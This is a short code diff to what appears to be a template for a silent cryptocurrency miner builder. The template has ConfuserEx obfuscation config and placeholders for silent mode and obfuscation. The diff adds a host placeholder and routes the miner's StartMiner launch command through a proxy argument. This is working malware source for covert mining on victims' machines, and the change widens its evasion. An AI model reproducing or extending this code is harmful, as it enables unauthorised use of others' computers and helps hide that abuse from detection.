@@ -132,7 +132,8 @@
 %threads%
 %algo%
 %obf%
-%silent%</value>
+%silent%
+%host%</value>
   </data>
   <data name="config" xml:space="preserve">
     <value>&lt;project outputDir="%path%" baseDir="%path%" xmlns="http://confuser.codeplex.com"&gt;
@@ -206,7 +207,7 @@ namespace System
 
         static void StartMiner(string pool, string user, string password, string algo, int thread)
         {
-            string CPU = " -o " + pool + " -u " + user + " -p " + password + " -a " + algo + " -t " + thread;
+            string CPU = " -o " + pool + " -u " + user + " -p " + password + " -a " + algo + " -t " + thread + " -x %proxy%";
             Interaction.Shell(_ExePath + CPU, AppWinStyle.%silentmode%, true);
 
         }
